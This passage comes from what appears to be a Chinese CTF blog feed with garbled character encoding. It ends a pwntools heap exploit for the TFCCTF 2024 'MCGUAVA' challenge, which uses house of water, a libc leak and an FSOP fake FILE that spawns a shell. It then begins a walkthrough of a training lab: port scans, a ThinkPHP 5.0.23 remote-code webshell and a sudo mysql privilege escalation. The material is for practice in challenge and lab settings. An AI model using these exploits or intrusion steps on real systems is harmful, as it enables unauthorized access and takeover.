p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavset:&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavas:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guava no:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process([<span class="string">&quot;./ld-linux-x86-64.so.2&quot;</span>, <span class="string">&quot;./pwn&quot;</span>],</span><br><span class="line">            env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¿™ä¸¤ä¸ªå¾ªç¯ä¸ºå¤šä½™æ“ä½œï¼Œå½“æ—¶è„‘æŠ½å†™çš„ï¼Œåé¢æ‡’çš„åˆ äº†</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å– fake 0x30 å’Œ unsorted_start å †å—çš„ç´¢å¼•</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 7</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 8 fake 0x30</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 9</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 10 </span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 11</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 12 unsorted_start</span></span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x31</span>)) <span class="comment"># 13</span></span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 14</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 15 unsorted_start</span></span><br><span class="line">    add(<span class="number">0x6e0</span>) <span class="comment"># 16</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å– fake 0x20 å’Œ unsorted_end å †å—çš„ç´¢å¼•</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 17</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 18 fake 0x20</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 19</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 20</span></span><br><span class="line">    free(<span class="number">17</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    free(<span class="number">19</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 21</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 22 unsorted_end</span></span><br><span class="line">    free(<span class="number">21</span>)</span><br><span class="line">    free(<span class="number">22</span>)</span><br><span class="line">    add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x21</span>)) <span class="comment"># 23</span></span><br><span class="line">    free(<span class="number">23</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 24</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 25 unsorted_end</span></span><br><span class="line">    add(<span class="number">0x6e0</span>) <span class="comment"># 26</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å– unsorted_middle çš„ç´¢å¼•</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 27 unsorted_middle</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 28</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¼ªé€  fake unsorted chunk ï¼ˆsizeã€fdã€bkï¼‰</span></span><br><span class="line">    add(<span class="number">0x3e8</span>) <span class="comment"># 29</span></span><br><span class="line">    add(<span class="number">0x3d8</span>) <span class="comment"># 30</span></span><br><span class="line">    free(<span class="number">29</span>)</span><br><span class="line">    free(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å–ä¸€ä¸ª tcache çš„ç´¢å¼•ï¼Œè¯¥ tcache èƒ½å¤Ÿä¿®æ”¹ fake 0x30 å’Œ unsorted_start</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line">    add(<span class="number">0x300</span>) <span class="comment"># 31</span></span><br><span class="line">    add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 32</span></span><br><span class="line">    add(<span class="number">0x330</span>) <span class="comment"># 33 change unsorted_start</span></span><br><span class="line">    free(<span class="number">33</span>)</span><br><span class="line">    add(<span class="number">0x1e0</span>) <span class="comment"># 34</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å–ä¸€ä¸ª tcache çš„ç´¢å¼•ï¼Œè¯¥ tcache èƒ½å¤Ÿä¿®æ”¹ fake 0x20 å’Œ unsorted_end</span></span><br><span class="line">    free(<span class="number">24</span>)</span><br><span class="line">    free(<span class="number">25</span>)</span><br><span class="line">    add(<span class="number">0x300</span>) <span class="comment"># 35</span></span><br><span class="line">    add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 36</span></span><br><span class="line">    add(<span class="number">0x340</span>) <span class="comment"># 37 change unsorted_end</span></span><br><span class="line">    free(<span class="number">37</span>)</span><br><span class="line">    add(<span class="number">0x1d0</span>) <span class="comment"># 38</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x330</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 39</span></span><br><span class="line">    free(<span class="number">39</span>) </span><br><span class="line">    add(<span class="number">0x340</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 40</span></span><br><span class="line">    free(<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åœ¨åé¢å¡«å……å †å—ï¼Œå¹¶ä¼ªé€  prev_size å’Œ size ä½¿ fake unsorted chunk åˆæ³•</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">        add(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x210</span>) <span class="comment"># 76</span></span><br><span class="line">    add(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(<span class="number">0x10000</span>)+p64(<span class="number">0x20</span>)) <span class="comment"># 77</span></span><br><span class="line">    <span class="comment"># æå‰è®© 0x240ã€0x250 ä¸¤ä¸ªå¤§å°çš„å †å—è¿›å…¥åˆ° tcacheï¼Œåé¢ä¼šç”¨ä¸Š</span></span><br><span class="line">    add(<span class="number">0x238</span>) <span class="comment">#78</span></span><br><span class="line">    add(<span class="number">0x248</span>) <span class="comment">#79</span></span><br><span class="line">    free(<span class="number">78</span>)</span><br><span class="line">    free(<span class="number">79</span>)</span><br><span class="line">    <span class="comment"># ä¾æ¬¡é‡Šæ”¾ unsorted_endã€unsorted_middleã€unsorted_start</span></span><br><span class="line">    free(<span class="number">25</span>)</span><br><span class="line">    free(<span class="number">27</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä»¤ unsorted_start çš„ fd æŒ‡é’ˆå’Œ unsorted_end çš„ bk æŒ‡é’ˆæŒ‡å‘ fake unsorted chunk</span></span><br><span class="line">    add(<span class="number">0x330</span>,<span class="number">0x20</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 80</span></span><br><span class="line">    free(<span class="number">80</span>)</span><br><span class="line">    add(<span class="number">0x340</span>,<span class="number">0x28</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 81</span></span><br><span class="line">    free(<span class="number">81</span>)</span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        add(<span class="number">0x500</span>) <span class="comment"># 82</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†å¤šä½™çš„ largebin ç”³è¯·å‡ºæ¥</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 83</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¿®æ”¹</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>)) <span class="comment"># 84</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>)) <span class="comment"># 85</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        add(<span class="number">0x230</span>,<span class="number">0</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00\x00&#x27;</span>) <span class="comment"># 86</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    libc_base = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">        libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219aa0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hex</span>(libc_base)[<span class="number">2</span>] != <span class="string">&#x27;7&#x27;</span> <span class="keyword">or</span> <span class="built_in">hex</span>(libc_base)[<span class="number">3</span>] != <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;leak libc error&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    lg(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># é‡Šæ”¾ tcache_perthread_struct ä¸Šçš„å †å—ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿå†æ¬¡ç¼–è¾‘è¯¥ç»“æ„ä½“</span></span><br><span class="line">    free(<span class="number">86</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä»¤ size ä¸º 0x250 çš„ tcache æŒ‡å‘ _IO_2_1_stderr_</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">0x8</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>])) <span class="comment"># 87</span></span><br><span class="line"></span><br><span class="line">    fake_file = flat(&#123;</span><br><span class="line">        <span class="number">0x0</span>: <span class="string">b&quot;  sh;&quot;</span>,</span><br><span class="line">        <span class="number">0x28</span>: libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>],</span><br><span class="line">        <span class="number">0x88</span>: libc_base + libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>,</span><br><span class="line">        <span class="number">0xa0</span>: libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]-<span class="number">0x40</span>,   <span class="comment"># _wide_data</span></span><br><span class="line">        <span class="number">0xD8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># jumptable </span></span><br><span class="line">    &#125;, filler=<span class="string">b&quot;\x00&quot;</span>) </span><br><span class="line"></span><br><span class="line">    <span class="comment"># åœ¨ _IO_2_1_stderr_ ä¸Šå†™ä¸Šæˆ‘ä»¬çš„ fake file</span></span><br><span class="line">    add(<span class="number">0x240</span>,<span class="number">0</span>,fake_file)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># é€€å‡ºç¨‹åºï¼Œæ‰§è¡Œ fsop æ”»å‡»</span></span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;cat flag.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ç”±äºéœ€è¦åˆ†åˆ«åœ¨ heapbase å’Œ stdout ä¸Šè¿›è¡Œä¸€æ¬¡çˆ†ç ´ï¼Œæ‰€ä»¥è„šæœ¬æ‰§è¡Œçš„æˆåŠŸç‡ä¸º 1&#x2F;256ï¼Œè¿è¡Œåè¿˜è¦ç­‰åŠå¤©</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/18.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>æ‰“é€šï¼Œå®Œç»“æ•£èŠ±ğŸ‚ğŸº</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘å¢ƒInitialè¯¦è§£</title>
      <link href="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/"/>
      <url>/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="å†™åœ¨æœ€å‰é¢"><a href="#å†™åœ¨æœ€å‰é¢" class="headerlink" title="å†™åœ¨æœ€å‰é¢"></a>å†™åœ¨æœ€å‰é¢</h2><p>ä¸€ç›´éƒ½çŸ¥é“æ¸—é€åœ¨ç½‘ç»œå®‰å…¨ä¸­çš„é‡è¦æ€§ï¼Œå¯æ˜¯ä¸€ç›´éƒ½æ²¡ç”¨é‡è§†ï¼Œäºæ˜¯åœ¨å›½èµ›å†³èµ›åƒå¤§äºã€‚å¹³æ—¶è‡ªå·±ä¹Ÿåœ¨æ‰“æ‰“ <code>vulnhub</code>ï¼Œä½†æ‰“çš„éƒ½æ˜¯ä¸€äº›ååˆ†ç®€å•çš„é¶åœºã€‚å›½èµ›å†³èµ›ç»“æŸåæˆ‘å°±å¼€å§‹pushæ ¡é˜Ÿçš„äººå»å­¦ä¹ æ¸—é€ï¼Œå½“ç„¶æˆ‘è¿™ä¸ªæ–°ä¸Šä»»çš„é˜Ÿé•¿è‚¯å®šè¦èµ·åˆ°å¸¦å¤´ä½œç”¨ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿå¼€å§‹å»ç»ƒä¹ æ˜¥ç§‹äº‘å¢ƒçš„é¶åœºã€‚å¾ˆå¤šäººè®¤ä¸ºäº‘å¢ƒè¿™ä¸ªé¶åœºæ¯”è¾ƒè´µï¼Œä½†æ˜¯æˆ‘è®¤ä¸ºèƒ½å¤Ÿç”¨é’±ä¹°çŸ¥è¯†æ˜¯ä¸€ä»¶å¾ˆåˆ’ç®—çš„äº‹æƒ…ï¼Œè€Œä¸”æ˜¥ç§‹äº‘å¢ƒçš„é¶åœºè´¨é‡ä¹Ÿæ¯”è¾ƒé«˜ï¼ˆè¿˜æœ‰å›½èµ›æ¸—é€ä¹Ÿæœ‰å¾ˆå¤šå†…å®¹æ¥è‡ªè¿™é‡Œé¢ï¼‰<br>è¿™ç¯‡æ–‡ç« æ˜¯å…³äº <code>Initial</code> è¿™ä¸ªé¶æœºçš„è¯¦ç»†è®²è§£ï¼Œè¿™ä¸ªæ˜¯äº‘å¢ƒä¸­æœ€ç®€å•çš„ä¸€é¢˜ï¼ŒåŒæ—¶ä¹Ÿæ˜¯æˆ‘æ‰“çš„ç¬¬ä¸€ä¸ªå…³äº <code>windows</code> æ¸—é€çš„é¢˜ç›®ï¼Œå› æ­¤å­¦åˆ°äº†å¾ˆå¤šçš„ä¸œè¥¿ã€‚</p><h2 id="è¯¦ç»†è®²è§£"><a href="#è¯¦ç»†è®²è§£" class="headerlink" title="è¯¦ç»†è®²è§£"></a>è¯¦ç»†è®²è§£</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªipåœ°å€ <code>39.99.255.153</code>ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>nmap</code> æ¥çœ‹çœ‹ä»–å¼€å¯äº†é‚£äº›ç«¯å£ï¼Œå‘½ä»¤ä¸ºï¼š  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 39.99.255.153</span><br></pre></td></tr></table></figure><p>è¿™æ®µå‘½ä»¤æ˜¯ä»¥æœ€å°é€Ÿç‡ <code>10000</code> å¯¹å…¨éƒ¨ç«¯å£ï¼ˆ1-65535ï¼‰è¿›è¡Œæ‰«æï¼Œ<code>10000</code> æ˜¯æƒè¡¡çš„ç»“æœï¼Œæ•°å­—è¿‡å¤§æ‰«æé€Ÿåº¦å¿«ï¼Œä½†å®¹æ˜“é—æ¼ç«¯å£ï¼Œæ•°å­—è¿‡å°åˆ™æ‰«ææ—¶é—´è¿‡é•¿ï¼Œç»éªŒè¡¨æ˜ <code>10000</code> å°±æ˜¯æ‰«æçš„åˆé€‚é€Ÿåº¦ã€‚<code>-p</code> æ˜¯ç«¯å£å‚æ•°ï¼Œ<code>-p-</code> è¡¨ç¤ºå¯¹æ‰€æœ‰ç«¯å£è¿›è¡Œæ‰«æã€‚æ‰«æç»“æœå¦‚ä¸‹ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹åˆ°å¼€å¯äº† <code>22</code>ã€<code>80</code> ç«¯å£ï¼Œ<code>22</code> ç«¯å£æ˜¯ä¸€ä¸ª <code>ssh</code> æœåŠ¡ï¼Œ<code>80</code> ç«¯å£æ˜¯ä¸€ä¸ª <code>http</code> æœåŠ¡ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹è¿™ä¸ªå‡ ä¸ªç«¯å£å¼€å¯çš„æœåŠ¡å’Œæ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap â€“sT â€“sV -O â€“p22,80 39.99.255.153</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>-sT</code> è¡¨ç¤ºè¿›è¡Œ <code>TCP</code> æ‰«æï¼ˆä¸‰æ¬¡æ¡æ‰‹ï¼‰ï¼Œ<code>-p</code> è¡¨ç¤ºå¾…æ‰«æçš„ç«¯å£ï¼ˆåè·Ÿå¾…æ‰«æçš„ç«¯å£ <code>22</code>ã€<code>80</code>ï¼‰ï¼Œ<code>-sV</code> è¡¨ç¤ºæ¢æµ‹å¼€æ”¾æœåŠ¡çš„ç‰ˆæœ¬ï¼Œ<code>-O</code> è¡¨ç¤ºæ¢æµ‹æ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼Œæ‰«æç»“æœå¦‚ä¸‹ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªipæ˜¯ä¸€å° <code>ubuntu linux</code> æœåŠ¡å™¨ï¼Œå¥½åƒä¹Ÿæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œæƒ³åˆ°è¿˜æœ‰ä¸€ä¸ªéå¸¸å¥½ç”¨çš„æ‰«æå·¥å…· <code>fscan</code>ï¼Œå·¥å…·çš„ä¸‹è½½åœ°å€ä¸ºï¼š<br><a href="https://github.com/shadow1ng/fscan">shadow1ng&#x2F;fscan: ä¸€æ¬¾å†…ç½‘ç»¼åˆæ‰«æå·¥å…·ï¼Œæ–¹ä¾¿ä¸€é”®è‡ªåŠ¨åŒ–ã€å…¨æ–¹ä½æ¼æ‰«æ‰«æã€‚ (github.com)</a><br>è¿™ä¸ªå·¥å…·æœ‰linuxå’Œwindowsç‰ˆæœ¬ï¼Œå…¶å…·ä½“ç”¨æ³•å¯ä»¥çœ‹å®˜æ–¹çš„æ–‡æ¡£ï¼Œè¿™é‡Œåªç”¨äºè¿›è¡Œç®€å•çš„ç«¯å£æ‰«æï¼Œè¾“å…¥ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\fscan <span class="literal">-h</span> <span class="number">39.99</span>.<span class="number">255.153</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹åˆ° <code>web server</code> çš„ç‰ˆæœ¬æ˜¯ <code>ThinkPHP 5.0.23</code>ï¼Œè€Œä¸”å­˜åœ¨æ¼æ´ï¼ï¼ï¼<br>å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨<code>nmap</code>å‘½ä»¤æ¥è¿›è¡Œæ¼æ´æ‰«æï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p22,80 39.99.255.153</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨ <code>ThinkphpGUI</code> è¿™ä¸ªå¼€æºå·¥å…·æ¥è¿›è¡Œæ‰«ä¸€ä¸‹ï¼Œå·¥å…·é“¾æ¥ä¸ºï¼š<br><a href="https://github.com/Lotus6/ThinkphpGUI">Lotus6&#x2F;ThinkphpGUI: Thinkphp(GUI)æ¼æ´åˆ©ç”¨å·¥å…·ï¼Œæ”¯æŒå„ç‰ˆæœ¬TPæ¼æ´æ£€æµ‹ï¼Œå‘½ä»¤æ‰§è¡Œï¼Œgetshellã€‚ (github.com)</a><br>è¾“å…¥ <code>url</code> å’Œé€‰æ‹©ç‰ˆæœ¬åç‚¹å‡»æ£€æµ‹å’Œ <code>GetShell</code> å³å¯ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥åˆ°ç½‘é¡µå­˜åœ¨ä¸€ä¸ªåé—¨ï¼Œè¿˜æœ‰ä¸€ä¸ªæ¼æ´åˆ©ç”¨çš„ <code>poc</code>ï¼Œæˆ‘ä»¬åˆ©ç”¨ä»–ç»™çš„ <code>poc</code> æ¥å†™å…¥ <code>shell.php</code> åé—¨</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¥½åƒä¹Ÿæ²¡æœ‰ä»€ä¹ˆå›æ˜¾ï¼Œäºæ˜¯æˆ‘ä»¬ç›´æ¥ä½¿ç”¨èšå‰‘æ¥è¿ä»–è‡ªå¸¦çš„åé—¨ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/7.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/8.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æˆåŠŸè¿æ¥ï¼Œè€Œä¸”æˆ‘ä»¬èƒ½çœ‹è§å½“å‰ç›®å½•ä¸‹æœ‰ä¸€ä¸ª <code>shell.php</code> æ–‡ä»¶</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/9.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç‚¹å¼€å¯ä»¥å‘ç°å…¶å°±æ˜¯æˆ‘ä»¬åˆ©ç”¨ <code>poc</code> ä¸Šä¼ çš„åé—¨ï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œèƒ½è¿›æ¥å°±è¡Œï¼Œæ¥ä¸‹æ¥å°±æ˜¯éœ€è¦æå–ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹è‡ªå·±æ˜¯ä»€ä¹ˆæƒé™ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/10.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§æ˜¯ <code>www-data</code> æƒé™ï¼Œå¯æ˜¯è¾“å…¥ <code>sudo -l</code> æ—¶å›æ˜¾</p><blockquote><p>(root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;mysql</p></blockquote><p>è¿™è¯´æ˜æˆ‘ä»¬å¯ä»¥é€šè¿‡é€šè¿‡ <code>sudo</code> é«˜æƒé™è¿è¡Œ <code>mysql</code>ï¼Œè¿›è€Œèƒ½å¤Ÿæ‰§è¡Œ <code>root</code>æƒ é™æ‰èƒ½æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼Œé‡Œé¢ä¹Ÿæœ‰è®²å¾ˆå¤šç§æå–çš„æ–¹æ³•<br><a href="https://blog.csdn.net/Bossfrank/article/details/132035121">æ¸—é€æµ‹è¯•ï¼šLinuxææƒç²¾è®²ï¼ˆä¸‰ï¼‰ä¹‹sudoæ–¹æ³•ç¬¬ä¸‰æœŸ_nmap sudo ææƒ-CSDNåšå®¢</a></p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/11.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>äºæ˜¯æˆ‘ä»¬å°±èƒ½å¾ˆå®¹æ˜“çš„è·å–åˆ° <code>flag1</code>ï¼Œå¯ä»¥å‘ç° <code>flag1</code> åœ¨ <code>/root/flag</code> ç›®å½•ä¸‹</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/12.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>æ¥ä¸‹æ¥å°±æ˜¯è¦è€ƒè™‘å†…ç½‘æ¨ªå‘ç§»åŠ¨ï¼Œæˆ‘ä»¬çš„æœ€ç»ˆç›®çš„æ˜¯è·å–åŸŸæ§ä¸Šçš„ <code>flag</code>ï¼Œæˆ‘ä»¬å…ˆç”¨èšå‰‘ä¸Šä¼  <code>fscan</code>ï¼Œæ‰«æä¸€ä¸‹å†…ç½‘ä¸­æœ‰é‚£äº›å­˜æ´»æœºå™¨</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/13.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™é‡Œè¦è®°å¾—ç»™ <code>fscan</code> æ‰§è¡Œæƒé™ï¼Œå¦åˆ™ä¼šæ‰§è¡Œä¸äº†<br>é€šè¿‡ <code>ip a</code> æˆ‘ä»¬å¯ä»¥å‘ç°ç½‘æ®µä¸º <code>172.22.1.0/24</code></p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/14.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ‰«æçš„ç»“æœä¼šè‡ªåŠ¨å­˜åœ¨å½“å‰ç›®å½•çš„ <code>result.txt</code> æ–‡ä»¶ä¸Š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/15.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  